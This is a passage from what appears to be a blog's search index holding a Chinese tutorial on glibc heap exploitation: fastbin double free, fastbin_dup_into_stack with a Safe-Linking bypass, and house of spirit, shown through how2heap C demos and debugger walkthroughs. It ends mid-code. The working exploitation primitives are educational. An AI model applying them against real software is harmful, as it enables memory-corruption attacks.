<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>【堆利用】fastbin-attack学习总结</title>
    <link href="/2024/11/19/%E3%80%90%E5%A0%86%E5%88%A9%E7%94%A8%E3%80%91fastbin-attack%E7%AF%87/"/>
    <url>/2024/11/19/%E3%80%90%E5%A0%86%E5%88%A9%E7%94%A8%E3%80%91fastbin-attack%E7%AF%87/</url>
    
    <content type="html"><![CDATA[<div class="markdown-body"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本篇中的demo均来自 <em><a href="https://github.com/shellphish/how2heap">how2heap</a></em> 中的例子</p><p>华庭师傅的 <em><a href="https://github.com/kubansec/Ebooks/blob/main/glibc%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86ptmalloc%E6%BA%90%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90.pdf">《glibc内存管理ptmalloc源代码分析》</a></em> 是一个很好的glibc机制入门资料，值得精读</p><p>由于我使用的glibc为2.35，glibc在2.26引入了tcache chunk，所以我们演示fastbin攻击要先填满tcache，然后也不能用malloc(size)，而是用calloc(1,size)，因为calloc()不会去从tcache中查找堆块，这样能保证我们操作的chunk全部位于fastbin</p><h1 id="fastbin-dup"><a href="#fastbin-dup" class="headerlink" title="fastbin_dup"></a>fastbin_dup</h1><p>演示一个基于 fastbin 的double-free攻击。 </p><h2 id="fastbin-dup-c-源代码"><a href="#fastbin-dup-c-源代码" class="headerlink" title="fastbin_dup.c 源代码"></a>fastbin_dup.c 源代码</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// 禁用标准输出缓冲区</span><br>    <span class="hljs-built_in">setbuf</span>(stdout, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-comment">// 填满 tcache</span><br>    <span class="hljs-type">void</span> *ptrs[<span class="hljs-number">8</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) &#123;<br>        ptrs[i] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">7</span>; i++) &#123;<br>        <span class="hljs-built_in">free</span>(ptrs[i]);<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;1.calloc三个chunk\n&quot;</span>);<br>    <span class="hljs-type">int</span> *a = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-number">8</span>);<br>    <span class="hljs-type">int</span> *b = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-number">8</span>);<br>    <span class="hljs-type">int</span> *c = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-number">8</span>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;第1次 calloc(1, 8): %p\n&quot;</span>, a);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;第2次 calloc(1, 8): %p\n&quot;</span>, b);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;第3次 calloc(1, 8): %p\n&quot;</span>, c);<br><br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;2.然后依次释放 a,b,a 的chunk...\n&quot;</span>);<br>    <span class="hljs-built_in">free</span>(a);<br>    <span class="hljs-built_in">free</span>(b);<br>    <span class="hljs-built_in">free</span>(a);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;现在fast bins链表为 [ %p, %p, %p ]\n&quot;</span>, a , b , a) ;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;3.如果我们再分配3个chunk，将会得到%p\n&quot;</span>, a);<br>    a = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-number">8</span>);<br>    b = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-number">8</span>);<br>    c = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-number">8</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;第1次 calloc(1, 8): %p\n&quot;</span>, a);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;第2次 calloc(1, 8): %p\n&quot;</span>, b);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;第3次 calloc(1, 8): %p\n&quot;</span>, c);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>编译运行（gcc记得加上”-g”参数，用gdb调试时会很方便）</p><h2 id=""><a href="#" class="headerlink" title=""></a><img src="/img/p4/image-19.png"></h2><p>接下来我们在pwndbg里面看，下好断点运行</p><h2 id="1-分配三个chunk"><a href="#1-分配三个chunk" class="headerlink" title="1.分配三个chunk"></a>1.分配三个chunk</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">int</span> *a = calloc(<span class="hljs-number">1</span>, <span class="hljs-number">8</span>); <br><span class="hljs-attribute">int</span> *b = calloc(<span class="hljs-number">1</span>, <span class="hljs-number">8</span>);<br><span class="hljs-attribute">int</span> *c = calloc(<span class="hljs-number">1</span>, <span class="hljs-number">8</span>);<br></code></pre></td></tr></table></figure><p>分配三个chunk，查看堆<br><img src="/img/p4/image-5.png"></p><p>使用parseheap查看堆结构更清晰<br><img src="/img/p4/image-11.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 记录三个chunk的起始地址</span><br><span class="hljs-attribute">chunk</span> a: <span class="hljs-number">0</span>x555555559390<br><span class="hljs-attribute">chunk</span> b: <span class="hljs-number">0</span>x5555555593b0<br><span class="hljs-attribute">chunk</span> c: <span class="hljs-number">0</span>x5555555593d0<br></code></pre></td></tr></table></figure><p>查看bins，可以看到此时bins（除了tcache）都是空的<br><img src="/img/p4/image-6.png"></p><h2 id="2-依次释放-a-b-a-的chunk"><a href="#2-依次释放-a-b-a-的chunk" class="headerlink" title="2.依次释放 a,b,a 的chunk"></a>2.依次释放 a,b,a 的chunk</h2><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">free</span>(a);<br><span class="hljs-built_in">free</span>(b);<br><span class="hljs-built_in">free</span>(a);<br></code></pre></td></tr></table></figure><p>依次释放 a,b,a 的chunk，查看每次free后的bins的情况<br><img src="/img/p4/image-7.png" alt="free(a)"><br><img src="/img/p4/image-8.png" alt="free(b)"><br><img src="/img/p4/image-9.png" alt="free(a)"><br>可以看到，<strong>fastbins 是一个单链表，fastbins会将free掉的chunk添加到了链表的头部。</strong></p><blockquote><p>Q: 为什么不直接free(a)之后接着free(a)呢？<br>A: 由于 free 的过程会对 free list 做检查，我们不能连续两次 free 同一个 chunk，但是我们可以在两次 free(a) 之间，增加了一次对其他 chunk 的 free 过程，从而绕过检查顺利执行。</p></blockquote><h2 id="3-再次分配三个chunk"><a href="#3-再次分配三个chunk" class="headerlink" title="3.再次分配三个chunk"></a>3.再次分配三个chunk</h2><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">a</span> = calloc(<span class="hljs-number">1</span>, <span class="hljs-number">8</span>)<span class="hljs-comment">;</span><br><span class="hljs-attr">b</span> = calloc(<span class="hljs-number">1</span>, <span class="hljs-number">8</span>)<span class="hljs-comment">;</span><br><span class="hljs-attr">c</span> = calloc(<span class="hljs-number">1</span>, <span class="hljs-number">8</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>然后依次分配三个chunk，观察堆结构和bins的变化</p><p>第一次分配chunk，将fastbins链表头部的元素0x555555559390分配给了变量a <strong>（说明fastbins是LIFO——后进先出）</strong>，并且fastbins链表中还有0x555555559390，所以尽管这个chunk已经被分配了，但它依然被标记为了free，意味着也就能被再次分配给其他变量。<br><img src="/img/p4/image-12.png" alt="a = calloc(1, 8);"></p><p>第二次分配chunk，这时候链表某端的地址是0x5555555593b0，所以它被分配给了b，此时链表中就剩下最后的0x555555559390<br><img src="/img/p4/image-13.png" alt="b = calloc(1, 8);"></p><p>第三次分配chunk，将链表某端的0x555555559390再次分配给了变量c<br><img src="/img/p4/image-14.png" alt="c = calloc(1, 8);"></p><p>也就有了两个指向同一块内存区域的指针。<br><img src="/img/p4/image-16.png"></p><p>当我修改指针c的值时，指针a的值也会被修改<br><img src="/img/p4/image-17.png"></p><hr><h1 id="fastbin-dup-into-stack"><a href="#fastbin-dup-into-stack" class="headerlink" title="fastbin_dup_into_stack"></a>fastbin_dup_into_stack</h1><p>扩展fastbin_dup.c，演示malloc返回一个指向栈上空间的指针。</p><h2 id="fastbin-dup-into-stack-c-源代码"><a href="#fastbin-dup-into-stack-c-源代码" class="headerlink" title="fastbin_dup_into_stack.c 源代码"></a>fastbin_dup_into_stack.c 源代码</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><br><span class="hljs-comment">//首先填满tcache</span><br>    <span class="hljs-type">void</span> *ptrs[<span class="hljs-number">7</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">7</span>; i++) &#123;<br>ptrs[i] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">7</span>; i++) &#123;<br><span class="hljs-built_in">free</span>(ptrs[i]);<br>&#125;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var[<span class="hljs-number">4</span>] __attribute__ ((<span class="hljs-built_in">aligned</span> (<span class="hljs-number">0x10</span>)));<br>    stack_var[<span class="hljs-number">1</span>] = <span class="hljs-number">0x20</span>;<br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;栈上创建一个数组，数组地址为%p，写入0x20（用于伪造的chunk size字段）\n&quot;</span>,stack_var);<br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;我们想通过 malloc 申请到 %p.\n&quot;</span>, stack_var<span class="hljs-number">+2</span>);<br><br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;1. 分配3个chunk。\n&quot;</span>);<br><span class="hljs-type">int</span> *a = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>);<br><span class="hljs-type">int</span> *b = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>);<br><span class="hljs-type">int</span> *c = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>);<br><br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;第一次calloc(1,8): %p\n&quot;</span>, a);<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;第二次calloc(1,8): %p\n&quot;</span>, b);<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;第三次calloc(1,8): %p\n&quot;</span>, c);<br><br><br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;2. 依次free a,b,a 的chunk，暴露double free漏洞\n&quot;</span>);<br><span class="hljs-built_in">free</span>(a);<br><span class="hljs-built_in">free</span>(b);<br><span class="hljs-built_in">free</span>(a);<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;现在fastbins链表为 [ %p, %p, %p ]。\n&quot;</span>, a, b, a);<br><br>    <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;3. 分配两个chunk\n&quot;</span>);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *d = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>);<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;第一次calloc(1,8): %p\n&quot;</span>, d);<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;第二次calloc(1,8): %p\n&quot;</span>, <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>));<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;现在fastbins链表为 [ %p ]。\n&quot;</span>, a);<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;现在，我们修改第一次malloc的%p，就会同时修改fastbins中的头部元素中fd的值\n&quot;</span>, d);<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;覆盖 %p 的内容——stack_var的地址，fastbins中头部元素的fd字段同时也会填入相同的内容。\n&quot;</span>, d);<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ptr = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)stack_var;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) d;<br>*d = (addr &gt;&gt; <span class="hljs-number">12</span>) ^ ptr;<br><br><br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;第三次calloc(1,8): %p，将栈地址放入fastbins链表中\n&quot;</span>, <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>));<br><br><span class="hljs-type">void</span> *p = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>);<br><br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;第四次calloc(1,8): %p\n，发现这一次malloc的空间在栈上！\n&quot;</span>, p);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>编译运行结果<br><img src="/img/p4/image-21.png"></p><h2 id="0-布置栈结构"><a href="#0-布置栈结构" class="headerlink" title="0. 布置栈结构"></a>0. 布置栈结构</h2><p>栈上创建一个数组，在第二个元素写入0x20</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">unsigned</span> long stack_var[<span class="hljs-number">4</span>] __attribute__ ((aligned (<span class="hljs-number">0</span>x10)));<br><span class="hljs-attribute">stack_var</span>[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>x20;<br></code></pre></td></tr></table></figure><blockquote><p>C语言内存对齐与attribute选项介绍<a href="https://blog.csdn.net/21aspnet/article/details/6729724">https://blog.csdn.net/21aspnet/article/details/6729724</a></p></blockquote><p>这样我们在栈上就有了这样的一块空间，fastbin_dup_into_stack想要将malloc的空间指向stack_var[2]。<br><img src="/img/p4/image-25.png"></p><h2 id="1-分配3个chunk"><a href="#1-分配3个chunk" class="headerlink" title="1. 分配3个chunk"></a>1. 分配3个chunk</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">int</span> *a = calloc(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>);<br><span class="hljs-attribute">int</span> *b = calloc(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>);<br><span class="hljs-attribute">int</span> *c = calloc(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>);<br></code></pre></td></tr></table></figure><p>画一下堆栈图<br><img src="/img/p4/image-34.png"></p><h2 id="2-依次free-a-b-a-的chunk"><a href="#2-依次free-a-b-a-的chunk" class="headerlink" title="2. 依次free a,b,a 的chunk"></a>2. 依次free a,b,a 的chunk</h2><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">free</span>(a);<br><span class="hljs-built_in">free</span>(b);<br><span class="hljs-built_in">free</span>(a);<br></code></pre></td></tr></table></figure><p>看一下程序依次释放完chunk a,b,c后，堆结构和fastbins的情况<br><img src="/img/p4/image-22.png"></p><p>此时的堆栈图（fastbins通过fd指针找到下一个free chunk）<br><img src="/img/p4/image-45.png"></p><h2 id="3-分配两个chunk"><a href="#3-分配两个chunk" class="headerlink" title="3. 分配两个chunk"></a>3. 分配两个chunk</h2><p>分配两个chunk,将第一个malloc chunk 标记为d的chunk，第二个不用管</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">unsigned</span> long *d = calloc(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>);<br><span class="hljs-attribute">calloc</span>(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>)<br></code></pre></td></tr></table></figure><p>那么，fastbins中就剩下a的chunk了<br><img src="/img/p4/image-23.png"><br>此时的堆栈图<br><img src="/img/p4/image-40.png"></p><h2 id="ATTACK"><a href="#ATTACK" class="headerlink" title="ATTACK"></a>ATTACK</h2><p>此时，d分配到的chunk其实是之前a的chunk，<strong>而fastbins中我们的a还在的！所以当我们对d写入数据时，fastbins中的值也会被覆盖 （我们想要覆盖free chunk的fd指针）</strong></p><p>既然我们想要malloc到栈上stack_var[2]的地址，我们的第一个想法只要fastbins中free chunk 的fd指针指向stack_var[2]就可以了<br>但这样离成功还差一步，因为正常来讲fd指针指向的是chunk的开头，也就是prev size字段，而不是数据段开头，所以我们fd指针要指向stack_var[0]的地址，也就是stack_var<br>我们的栈空间被malloc得到的chunk预想应该是这样的<br><img src="/img/p4/image-42.png"></p><p><strong>向d中写入的data就是fastbins中a chunk的fd字段</strong>，所以现在覆盖前 8 字节，修改 fd 指针指向stack_var</p><blockquote><p>在glibc 2.32之前，我们只需要这样的代码，就可以修改d的data字段值为stack_var的地址</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">*d <span class="hljs-operator">=</span> stack_var<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure></blockquote><blockquote><p>但是2.32更新了一个叫<a href="https://research.checkpoint.com/2020/safe-linking-eliminating-a-20-year-old-malloc-exploit-primitive">“Safe-Linking”（安全链接）</a>的保护机制，<br>这篇博客的重点不在这里，现在只需要知道我们要通过下述代码写入d chunk data段的前八个字节，从而覆盖fd指针</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ptr = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)stack_var;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> addr = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) d;<br>*d = (addr &gt;&gt; <span class="hljs-number">12</span>) ^ ptr;<br></code></pre></td></tr></table></figure></blockquote><p>这样一来，fastbins中的a chunk的fd指针就指向了stack_var<br><img src="/img/p4/image-44.png"></p><p><img src="/img/p4/image-50.png" alt="fastbins中多了一个栈空间上的元素"></p><p>我们把fastbins中的a分配出去，stack_var来到fastbins的头部，此时堆管理器认为fastbins中还有一个free chunk，而这个“chunk”其实在栈上<br><img src="/img/p4/image-46.png"><br><img src="/img/p4/image-51.png" alt="此时的fastbins"><br><img src="/img/p4/image-52.png" alt="看到chunk a和 chunk d是同一个chunk"></p><p>这时候为p变量 malloc一块空间，就会申请到fastbins指向的栈上的stack_var的一块0x20大小的空间<br><img src="/img/p4/image-53.png" alt="查看p变量的地址"><br><img src="/img/p4/image-54.png"><br>至此，我们攻击了堆，让malloc返回了一个指向栈上空间的指针</p><hr><h1 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house of spirit"></a>house of spirit</h1><p>演示 House of Spirit 攻击，该攻击通过将非堆地址加入 fastbins，导致任意地址写操作。</p><h2 id="house-of-spirit-c-源代码"><a href="#house-of-spirit-c-源代码" class="headerlink" title="house_of_spirit.c 源代码"></a>house_of_spirit.c 源代码</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">setbuf</span>(stdout, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">// 禁用缓冲区，确保输出按顺序显示</span><br><br><span class="hljs-comment">//填满 tcache</span><br><span class="hljs-type">void</span> *chunks[<span class="hljs-number">7</span>];<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">7</span>; i++) &#123;<br>chunks[i] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>); <br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">7</span>; i++) &#123;<br><span class="hljs-built_in">free</span>(chunks[i]); <br>&#125;<br><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;1: 准备 fake chunk。&quot;</span>);<br><span class="hljs-type">long</span> fake_chunks[<span class="hljs-number">10</span>] __attribute__ ((<span class="hljs-built_in">aligned</span> (<span class="hljs-number">0x10</span>))); <span class="hljs-comment">// 16 字节对齐</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fake chunk 的地址是 %p\n&quot;</span>, fake_chunks);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fake chunk 包含两个 chunk。第一个 chunk 的起始地址为 %p，第二个 chunk 的起始地址为 %p。\n&quot;</span>, &amp;fake_chunks[<span class="hljs-number">1</span>], &amp;fake_chunks[<span class="hljs-number">9</span>]);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;将第一个 fake chunk 的大小（%p）设置为 0x40，这样 malloc 会认为它是一个有效 chunk。\n&quot;</span>, &amp;fake_chunks[<span class="hljs-number">1</span>]);<br>fake_chunks[<span class="hljs-number">1</span>] = <span class="hljs-number">0x40</span>; <br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;将下一个 fake chunk 的大小（%p）设置为 0x1234，这样free第一个 fake chunk 时可以通过检查。\n&quot;</span>, &amp;fake_chunks[<span class="hljs-number">9</span>]);<br>fake_chunks[<span class="hljs-number">9</span>] = <span class="hljs-number">0x1234</span>; <br><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;2: 释放第一个 fake chunk&quot;</span>);<br><span class="hljs-type">void</span> *victim = &amp;fake_chunks[<span class="hljs-number">2</span>];<br><span class="hljs-built_in">free</span>(victim); <br><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;3: malloc fake chunk&quot;</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;接下来calloc 会返回我们的 fake chunk，地址为 %p！\n&quot;</span>, &amp;fake_chunks[<span class="hljs-number">2</span>]);<br><span class="hljs-type">void</span> *allocated = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-number">0x30</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;malloc(0x30): %p, fake chunk: %p\n&quot;</span>, allocated, victim);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>编译运行<br><img src="/img/p4/image-55.png"></p><h2 id="0-原理"><a href="#0-原理" class="headerlink" title="0. 原理"></a>0. 原理</h2><p>House Of Spirit将任意地址加入到 fastbins 中，从而malloc 到指定地址的 chunk。</p><p>House Of Spirit和 fastbin_dup 的区别是：</p><ul><li>fastbin_dup中free的chunk是程序自己malloc产生的，free时chunk就会进入fastbins链表中</li><li>house of spirit中free的chunk不是程序自己产生的，而是我们指定的一块内存空间”fake chunk”，free这个chunk让他进入fastbins</li></ul><p>一个chunk在被free之后归到fastbins之前会有一些检查，检查通过才会被加到fastbins中，所以我们要做一些努力，让程序相信这个fake chunk是合法的chunk：</p><ol><li>fake chunk 的 M 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。</li><li>fake chunk 地址内存对齐：32位0xXXXX0或0xXXXX4；64位0xXXXX0或0xXXXX8</li><li>fake chunk 的 size大小需要满足对应的 fastbin 的需求，同时也得对齐。</li><li>fake chunk 的 next chunk size不能小于 2 * SIZE_SZ，同时不能大于av-&gt;system_mem</li><li>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。</li></ol><h2 id="1-构造-fake-chunk"><a href="#1-构造-fake-chunk" class="headerlink" title="1. 构造 fake chunk"></a>1. 构造 fake chunk</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">long</span> fake_chunks[<span class="hljs-number">10</span>] __attribute__ ((aligned (<span class="hljs-number">0</span>x10))); // <span class="hljs-number">16</span> 字节对齐<br><span class="hljs-attribute">fake_chunks</span>[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>x40; <br><span class="hljs-attribute">fake_chunks</span>[<span class="hljs-number">9</span>] = <span class="hljs-number">0</span>x1234; 